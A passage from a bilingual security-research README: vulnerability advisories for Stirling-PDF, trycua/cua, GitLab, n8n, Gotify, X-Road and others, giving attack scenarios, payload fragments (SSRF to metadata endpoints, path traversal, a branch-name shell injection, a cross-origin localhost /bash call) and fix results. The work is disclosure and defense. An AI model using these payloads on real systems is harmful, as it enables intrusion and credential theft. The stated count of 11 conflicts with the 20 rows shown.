| **2. `zitadel`** | `67` 项超阈值（`8C / 42H`）；`286` 项分诊 | **全部 8 项严重 SQLi/`exec` 均为误报**；`deploy/compose/` 下 3 处 `docker.sock` 挂载与文档示例中的 `TLS_REJECT=0` 真实存在 | **低危 / 中危** | **否（位于不同示例）：** `docker.sock`（`deploy/compose/`）与 `TLS_REJECT=0`（`apps/docs/...`）位于不同文件 | **低危 / 中危** *（开发/示例部署加固；非产品 CVE）* |
| **3. `nextcloud-mcp`** | `59` 项超阈值（`SAST 1C/6H`, `IaC 7H`, `SCA 5C/40H`） | **`login_flow.py:192` SSRF（`initiate()` 内有 `_rewrite_to_nextcloud_host`）与 `token_utils.py` JWT 均为误报**；`pact.yml` 受 `same-repo` 保护 | **低危** | **否：** `pact.yml` 对外部 Fork PR 关闭；`poll_endpoint` 在 `initiate()` 中已绑定至 `self.nextcloud_host` | **低危** *（无已验证 SAST 漏洞；内部 CI 加固）* |
| **4. `mcpjam-inspector`** | `122` 项超阈值（`SAST 12C/8H`, `SCA 6C/96H`） | **20 项严重/高危 SAST 中 18 项为确认误报**（14 处注释 `eval (` / `exec (`、2 处 `.d.ts`、2 处 UI 字符串）；`pr-preview.yml` 受 `same-repo` 保护 | **低危** | **否：** 外部 Fork PR 已拦截；同仓库分支名插值建议加固 | **低危 / 中危** *（内部 CI 加固与 SCA 升级）* |
| **5. `codebase-memory-mcp`** | `32` 项超阈值（`SAST 17C/7H`, `SCA 8H`） | **`store.c:2864` SQLi、`c_lsp.h:54` 注释、`kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` 定长缓冲区、`xmalloc.c` 与 `mcp.c` 均为误报**；`http_server.c` 具 `localhost` CORS + `Host`（403）保护 | **低危** | **否：** `http_server.c` 不向外部源返回 CORS 头并拒绝 DNS 重绑定 | **低危** *（浏览器远程代码泄露链不成立）* |
| **6. `gitlab-mcp-server`** | `5` 项超阈值（`0C / 4H`） | `recorder.go` 与 `make.go` 为误报；`GITLAB_MCP_SKIP_TLS_VERIFY=true` 仅在用户主动设置时生效 | **低危** | **否：** 无可串联发现项 | **低危** *（可选配置项）* |
| **7. `apktool-mcp`** | `16` 项超阈值（`SAST 1 中危`, `SCA 4C / 12H`） | SAST 告警为误报；**`uv.lock` 中存在 4 项严重、12 项高危 SCA 依赖记录** | **低危 / 中危 (SCA)** | **否：** 无已验证一方代码攻击链；需升级依赖包 | **低危 / 中危 (SCA)** *（SAST 干净，存在 SCA 记录）* |
| **8. `jadx-mcp`** | `32` 项超阈值（`SAST 3 中危`, `SCA 6C / 26H`） | 无严重/高危 SAST 漏洞；**`uv.lock` 中存在 6 项严重、26 项高危 SCA 依赖记录** | **低危 / 中危 (SCA)** | **否：** 无已验证一方代码攻击链；需升级依赖包 | **低危 / 中危 (SCA)** *（无严重/高危 SAST，存在 SCA 记录）* |

---

## 第三部分 — Sniper 扫描发现的 11 项已验证安全漏洞（代码漏洞形成机制、日常场景与示例执行命令）

以下为我们通过 **Sniper** 静态/动态分析引擎发现并经 **分步日常关键场景（`场景 A / B / C`）**、**端到端运行时证明（`RED -> GREEN + BENIGN`）** 与 **已验证防御补丁（`git diff`）** 证实的 **11 项安全漏洞**（[advisories/README.zh-CN.md](advisories/README.zh-CN.md)）。首先展示汇总表，随后是包含 **每个漏洞在源码中如何产生、如何一步步演变为可利用漏洞、3 个日常关键场景以及示例执行/验证命令** 的 11 个深度技术章节（`III.01` – `III.11`）：

| # | 安全公告 & 上游 GHSA ID | 目标项目 & 组件 | CWE & CVSS v3.1 | 日常环境中引发的关键风险场景（`场景 A / B / C`） | 运行时证明（`RED -> GREEN`） |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/zh-CN/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** 放入共享 SMB/NFS 扫描仪监控目录的符号链接 `invoice.pdf -> /configs/settings.yml` 在默认 `recursive=false` 模式下绕过 `FolderAccessGuard`，将管理员密码、OAuth 与 SMTP 密钥泄露至输出目录。<br/>**B)** 在自动化 SFTP/Nextcloud 文档接入流水线中，植入的符号链接令 `FolderOutputSink.archiveOriginal()` 将宿主机 SSH 密钥或 `.env` 文件复制/移动至归档目录。<br/>**C)** 在多租户部门监控目录间，某一部门通过符号链接指向兄弟部门的机密合同/薪资目录，实现越权读取与删除。 | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/zh-CN/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` 修复不完整)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** 向 `/api/v1/convert/url/pdf` 提交包含 `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` 或云元数据（`169.254.169.254`）的外部网页时，WeasyPrint 会拉取内部响应并直接渲染进生成的 PDF。<br/>**B)** Java 层 `SsrfProtectionService` 仅检查顶层 URL，而 WeasyPrint 子进程通过 `@import url("http://10.0.0.12:9090/metrics")` 扫描 Kubernetes/Docker 内网微服务。<br/>**C)** 利用多跳 HTTP `302` 重定向的 `<img src="...">` 或 `<link>` 子资源，将防火墙后的内部管理面板导出为 PDF。 | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/zh-CN/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** 当开发者运行 `npx cuabot` 并浏览任意网页时，页面 JS 通过 `fetch("http://localhost:7842/bash")`（`Access-Control-Allow-Origin: *`）执行任意命令并窃取挂载的 `~/.cuabot/user/.claude/.credentials.json` OAuth 令牌。<br/>**B)** 通过跨域 `POST /bash` 或 `ws://localhost:7842/?command=...`（CSWSH）向可写的 `/home/community-user/.claude/settings.json` 注入持久化 `PreToolUse` 钩子。<br/>**C)** 因绑定在 `0.0.0.0:7842`，咖啡馆/办公室 Wi-Fi 上的任意设备无需密码即可调用 `/bash` 与 `/screenshot` 监控屏幕并执行命令。 | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/zh-CN/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** 强化学习研究员在浏览网页时，页面调用 `http://127.0.0.1:8001/reset`（`allow_origins=["*"]`）绕过 `ip_filter_middleware`，通过 `spec.loader.exec_module` 在宿主机上执行任意 `<env_path>/main.py`。<br/>**B)** 在 Kubernetes/Docker Compose 部署中若将 `OSGYM_ALLOWED_IPS=""` 设为空字符串，`if allowed_ips:` 检查失效放行（Fail-Open），使 `0.0.0.0:8001` 对全网开放无认证 RCE。<br/>**C)** 局域网或浏览器攻击者调用 `GET /screenshot` 与 `POST /step` 窃取活动桌面截图并注入键鼠指令。 | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/zh-CN/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** 单个沙箱租户无需预先发起分片上传，直接发送 `DELETE /daytona/dummy?uploadId=../objects`，触发无条件 `tokio::fs::remove_dir_all`，瞬间清空整个组织的 `objects/` 镜像库。<br/>**B)** 利用 `?uploadId=../../state` 或 `?uploadId=../../db` 跳出 `d.objects.root`，删除 `cua-spacesd` 进程可写的宿主机应用目录。<br/>**C)** 发送 `PUT /daytona/key?partNumber=1&uploadId=../stage` 将分片数据写入 `uploads/` 之外的相邻应用目录。 | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/zh-CN/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** macOS 远程桌面推流在窗口/分辨率切换时传入过短的 `FrameData::Nv12` 切片，无边界检查的 `unsafe { std::ptr::copy_nonoverlapping }` 将相邻堆内存中的 `960` 字节（会话密钥/令牌）复制进 H.264 视频帧并推流给观看者。<br/>**B)** 向 Safe Rust 方法 `VtEncoder::encode` 传入空或截断的 `NV12`/`BGRA` 切片会读取未映射内存，导致 `cua-spacesd` 媒体服务 `SIGSEGV` 崩溃。<br/>**C)** 畸形的 `y_stride` / `uv_stride` 或 `stride * (h - 1)` 算术越过缓冲区边界，引发多租户媒体进程内存损坏。 | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/zh-CN/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** 在大学/企业实验室局域网中运行的 WinArena 工作站将 `0.0.0.0:8006`（无认证 noVNC）与 `0.0.0.0:3390`（免密 RDP）暴露给整个局域网，任何人均可接管 Windows VM 桌面并窃取其中的 API 密钥。<br/>**B)** 攻击者从受控 VM 内部利用可写的 `-v {setup_path}:/shared` 挂载篡改宿主机上的 `winarena_adapter/infra/vm/setup` 脚本。<br/>**C)** VM 内部 `0.0.0.0:5000` 控制服务的无认证 `POST /execute_windows`（`exec()`）与 `POST /setup/launch`（`shell=True`）接口可被代理或局域网流量触发执行任意系统命令。 | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/zh-CN/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** 运维工程师通过 Wi-Fi/VPN 执行 `ziti edge login` 时，因 `AreCertsTrusted` -> `InsecureClient` 中无条件开启 `InsecureSkipVerify: true`，中间人伪造证书被提示 *"Verified that server supplied certificates are trusted"* 并直接将管理员密码发送给攻击者。<br/>**B)** 自动化 CI/CD 与 Kubernetes 引导流程中的 `ziti edge login` 信任伪造或沦陷的 Edge Controller，将身份与路由策略注册给攻击者。<br/>**C)** 在多环境切换中，过期、已吊销或错误 CA 签发的控制器证书在无任何告警的情况下被当作受信任证书接受，破坏零信任 PKI 链。 | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/zh-CN/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** 向公开线索收集/联系表单 n8n Webhook（`{{$json.body.contact.isEmail()}}`）发送单个 20 KB 的 `"a.a.a...a@!"` 请求即可阻塞 Node.js 主事件循环约 832 ms；10 个并发请求即可冻结所有 Stripe/Slack Webhook 与 n8n 界面。<br/>**B)** 解析客服邮件或聊天记录的 `{{$json.text.extractEmail()}}` 自动化流水线因单条含长点号字符串的消息而卡死，陷入容器健康检查重启循环。<br/>**C)** CRM 数据丰富工作流在评估 `{{$json.url.extractDomain()}}`（`DOMAIN_EXTRACT_REGEXP`）时，长点号 URL 负载会耗尽单线程 V8 运行时。 | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/zh-CN/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** 开启 `SSL.RedirectToHTTPS=true` 时，携带伪造 `Host: attacker-gotify.example.com` 头的请求会收到指向攻击者域名的 `HTTP/1.1 308 Permanent Redirect`，污染浏览器缓存并泄露 URL 中的 `?token=`。<br/>**B)** 向 HTTP 端点发送 `?token=<app-token>` 通知且自动跟随重定向的监控脚本（`curl -L`、Python `requests`、Uptime Kuma）会跟随 `308` 跳转将应用密钥交给攻击者服务器。<br/>**C)** 在透传 `Host` 头的反向代理或共享缓存后方运行的 Gotify 服务遭缓存投毒，所有客户端被重定向至钓鱼登录页。 | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/zh-CN/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** 形如 `feat";<cmd>;#` 的 PR 分支名在代码审查或 `actions/checkout` 运行之前，即在持久化 `xrd-runner-8c` 自托管构建机上的 `_build-and-package.yml` bash 脚本中执行任意命令。<br/>**B)** 由于 `build.yaml` 以 `permissions: contents: write, packages: write` 与 `secrets: inherit` 调用 `_build-and-package.yml`，注入命令可直接窃取具备 GHCR 镜像写权限与仓库写权限的 `GITHUB_TOKEN`。<br/>**C)** 因 `xrd-runner-8c` 是持久化自托管服务器而非临时虚拟机，攻击者可植入持久化后台进程或篡改本地 Gradle/Docker 缓存，污染后续官方 X-Road 发行包构建。 | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |
| **12** | [`12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/zh-CN/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)<br/>`GITLAB-CAND-02`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/oauth/device_authorizations_controller.rb:4-50`<br/>`app/controllers/oauth/tokens_controller.rb:42-75` | `CWE-863 / CWE-285`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | **How It Happens in Code:** `Oauth::DeviceAuthorizationsController` (`device_authorizations_controller.rb:4-50`) and `Oauth::TokensController` (`tokens_controller.rb:42-75`) omit `verify_admin_allowed!`, `verify_confirmed_email!`, `set_current_organization`, and `enforce_organization_maintenance_mode` (all enforced in sibling `Oauth::AuthorizationsController`).<br/>**Scenario A (Full Instance Admin Takeover):** A regular user creates an untrusted OAuth app (`trusted: false`); when an admin enters its `user_code` on `/oauth/device`, GitLab bypasses `disable_admin_oauth_scopes=true` and mints a full `api admin_mode` token allowing complete server takeover, private repo theft, and CI secret extraction.<br/>**Scenario B (Unverified Account API Backdoor):** An unconfirmed account (`confirmed_at: nil`) blocked on `/oauth/authorize` (`403`) mints persistent API & refresh tokens via `/oauth/device`.<br/>**Scenario C (Backdoor Commit During Legal/Migration Freeze):** Attackers mint tokens and push commits (`201 Created`) into frozen repositories while an organization is locked in `migration` (`503`) or `legal` (`403`) maintenance mode. | `RED`: `token_minted_admin_mode: true, post_token_admin_action_succeeded: true`<br/>`GREEN`: `503 / 403, token_minted_admin_mode: false`<br/>`pytest -k test_report1_cand02` |
| **13** | [`13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/zh-CN/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)<br/>`GITLAB-CAND-05`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`<br/>`refresh_token_service.rb:18-70`<br/>`dynamic_registration_client.rb:104-136` | `CWE-918 / CWE-209`<br/>**8.5 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `CallbackService`, `RefreshTokenService`, `RevokeTokenService`, and `DynamicRegistrationClient` accept unvalidated RFC 8414 `token_endpoint`/`revocation_endpoint` URLs and use `OAuth2::Client` (`max_redirects: 5`, no `UrlBlocker`), reflecting raw `OAuth2::Error` bodies into `flash[:alert]`.<br/>**Scenario A (Stealing Cloud IAM Keys via `flash[:alert]`):** A `307 Temporary Redirect` on `token_endpoint` hits `169.254.169.254` or `127.0.0.1` and prints cloud IAM credentials / internal API responses directly into the user's `flash[:alert]` banner.<br/>**Scenario B (Internal `POST` SSRF & Secret Replay):** `OAuth2::Client` replays `POST` requests with `client_secret` and `refresh_token` to firewalled internal `127.0.0.1` services.<br/>**Scenario C (`RevokeTokenService` SSRF):** Disconnecting an MCP server posts Basic Auth credentials to unvalidated internal/external `revocation_endpoint` targets. | `RED`: `canary_b_request_count: 5, iam_role_credentials_exposed: true`<br/>`GREEN`: `canary_b_request_count: 0, iam_role_credentials_exposed: false`<br/>`pytest -k test_report2_cand05` |
| **14** | [`14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/zh-CN/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)<br/>`GITLAB-CAND-06`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`<br/>`ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`<br/>`ee/lib/gitlab/oauth/client_state.rb:17-23` | `CWE-639 / CWE-862`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | **How It Happens in Code:** `Oauth::McpConnectorsAuthController` calls global `Ai::Catalog::McpServer.find(params[:id])` without `.in_organization(Current.organization)`, `ConnectService` overwrites DCR credentials without checking `update_ai_catalog_mcp_server`, and `ClientState.from_state` discards `data` binding.<br/>**Scenario A (Cross-Organization AI Connector Hijack):** A user in Organization A overwrites `oauth_client_id` / `oauth_client_secret` on an `McpServer` belonging to Organization B.<br/>**Scenario B (Read-Only User Overwrites Production Connector):** A non-maintainer with read-only access overwrites company MCP OAuth credentials via DCR.<br/>**Scenario C (Cross-Session Account Binding / Login CSRF):** Replaying an unbound `ClientState` token binds a victim developer's GitLab session to the attacker's external MCP account. | `RED`: `cross_org_server_mutated: true`<br/>`GREEN`: `cross_org_server_mutated: false (404 RecordNotFound)`<br/>`pytest -k test_report2_cand05` |
| **15** | [`15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/zh-CN/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)<br/>`GITLAB-CAND-01`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239` | `CWE-918 / CWE-522`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `externalMcpTransport` in `workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44` omits `transport.WithSSRFFilter()`, and `roundTripper.RoundTrip` (`mcp.go:101-104`) re-injects `Authorization: Bearer` headers on every redirect hop.<br/>**Scenario A (Bearer Token Theft & Account Takeover):** A `302` redirect from an external MCP server sends the victim's live `Authorization: Bearer` token to a cross-origin attacker server.<br/>**Scenario B (Workhorse Internal & Cloud Metadata SSRF):** Redirects reach `127.0.0.1` internal services or `169.254.169.254` from the Workhorse process.<br/>**Scenario C (DNS Rebinding into Corporate Intranet):** DNS rebinding bypasses initial URL validation because Workhorse's dialer lacks `WithSSRFFilter`. | `RED`: `bearer_token_leaked_to_canary: true`<br/>`GREEN`: `bearer_token_leaked_to_canary: false, ssrfFilterError: disallowlist`<br/>`pytest -k test_report2_cand05` |
| **16** | [`16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/zh-CN/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)<br/>`GITLAB-CAND-08`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`<br/>`ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`<br/>`connection_config_service.rb:220-228` | `CWE-862 / CWE-639`<br/>**7.7 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `McpConfigService#item_version` (`mcp_config_service.rb:134`) omits `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)` (enforced at line 334), and `workflows.rb:1065` (`GET /ws`) allows overriding `workflow_definition` and `ai_catalog_item_version_id`.<br/>**Scenario A (Escalating Read-Only `chat` to Write-Capable Agent):** Overriding `workflow_definition` and `ai_catalog_item_version_id` on `/ws` injects withheld write tools (`create_issue`) into a restricted `chat` session.<br/>**Scenario B (Stealing Private `public: false` Agent Toolsets):** Enumerating `ai_catalog_item_version_id` discloses the confidential toolset of foreign private AI Catalog agents.<br/>**Scenario C (Unauthorized Private Agent Binding):** `POST /workflows` binds private cross-organization `ItemVersion` records without `:read_ai_catalog_item` checks. | `RED`: `unapproved_write_tool_injected: true, workflow_definition_overridden: true`<br/>`GREEN`: `unapproved_write_tool_injected: false`<br/>`pytest -k test_report3_cand08` |
| **17** | [`17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/zh-CN/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)<br/>`GITLAB-CAND-07`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`<br/>`ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:254` | `CWE-863 / CWE-639`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` | **How It Happens in Code:** `McpConfigService#execute` (`mcp_config_service.rb:61`) calls `.merge(ai_catalog_mcp_servers.except(:orbit))` without excluding `:gitlab`, and `ListService`/`Agent::Create` omit `.in_organization`.<br/>**Scenario A (Unlocking All Prohibited Built-in GitLab MCP Tools):** An `Ai::Catalog::McpServer` named `"GitLab"` (`:gitlab`, `Tools: nil`) overwrites the built-in `:gitlab` entry so Workhorse (`mcp.go:254`) sets `allToolsAvailable = true`, disabling all `withheld_server_tools` restrictions.<br/>**Scenario B (Cross-Org MCP Server Binding):** GraphQL `aiCatalogAgentCreate`/`Update` binds foreign-organization `McpServer` Global IDs.<br/>**Scenario C (Duo Workflow `401` DoS):** Overwriting `Headers` on `:gitlab` strips `X-Gitlab-Oauth-Token` and breaks `/api/v4/mcp`. | `RED`: `builtin_gitlab_overwritten: true, workhorse_all_tools_available: true`<br/>`GREEN`: `builtin_gitlab_overwritten: false, workhorse_all_tools_available: false`<br/>`pytest -k test_report4_cand07` |
| **18** | [`18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/zh-CN/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)<br/>`GITLAB-CAND-04`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/projects/integrations/slash_commands_controller.rb:21-48`<br/>`app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76` | `CWE-601 / CWE-863`<br/>**5.4 Medium**<br/>`AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | **How It Happens in Code:** `SlashCommandsController#confirm` (`slash_commands_controller.rb:23-48`) redirects to unvalidated `request_params[:redirect_url]`, passes `request_params[:response_url]` to `VerifyRequest`, and keys Redis `CACHE_KEY` only by `command_id` without `project_id`/`integration_id`.<br/>**Scenario A (Corporate SSO Phishing After Slash Command Confirm):** Confirming a slash command on the trusted GitLab domain redirects (`302 Found`) the developer to an external credential-harvesting page.<br/>**Scenario B (Cross-Project ChatOps Account Binding):** A `command_id` minted in Project B is accepted on Project A's `/slash_commands/confirm` endpoint.<br/>**Scenario C (ChatOps Callback Hijack):** `request_params[:response_url]` overrides the cached `response_url` during `VerifyRequest#approve!`. | `RED`: `http_status: 302, open_redirect_triggered: true, cross_project_cache_collision_accepted: true`<br/>`GREEN`: `404, open_redirect_triggered: false`<br/>`pytest -k test_report5_cand04` |
| **19** | [`19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/zh-CN/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)<br/>Upstream Duplicate: `CVE-2026-40295`<br/>*(GitHub Only — Not Submitted to MITRE)* | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`lib/gitlab/devise_failure.rb:4-18`<br/>`lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`<br/>`app/controllers/oauth/authorizations_controller.rb:316-330` | `CWE-601 / CWE-345`<br/>**5.4 Medium (Upstream CVE-2026-40295 Duplicate)**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **[UPSTREAM DUPLICATE: `CVE-2026-40295` — Published on GitHub Only, Not Submitted to MITRE]**<br/>**How It Happens in Code:** `Gitlab::DeviseFailure` inherits `Devise 5.0.3` `redirect_url` (`CVE-2026-40295`), which redirects to an unsanitized external `Referer` on non-GET `:timeout` failures; `AuthorizationsController#validate_pkce_for_dynamic_applications` (`CAND-03`) has an early return on `nil` `code_challenge_method` (mitigated at runtime by `Doorkeeper 5.9.3`).<br/>**Scenario A/B/C:** Product-level `extract_path_from_location(request.referrer)` override in `lib/gitlab/devise_failure.rb` and controller-level PKCE defense-in-depth patch. | `DUPLICATE OF CVE-2026-40295` *(Not submitted to MITRE)*<br/>`RED`: `external_referer_redirect: true`<br/>`GREEN`: `path_extracted_only: true` |
| **20** | [`20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/zh-CN/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)<br/>`CHIA-WLC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`) | `CWE-345 / CWE-347`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `WalletNode._add_block_from_header` (`wallet_node.py:926-995`) ingests `header_block.foliage_transaction_block` without verifying `foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash`.<br/>**Scenario A (0-XCH Capital Fake Deposit):** With zero XCH capital and no counterparty approval, an attacker sends a real header with a swapped transaction block to credit `+0.5 XCH` (`500,000,000,000 mojo`) as confirmed and cash out real USDT/BTC.<br/>**Scenario B (Persistent SQLite Poisoning):** Counterfeit coins persist across `WalletCoinStore` cold restarts (`Err.UNKNOWN_UNSPENT` on spend).<br/>**Scenario C 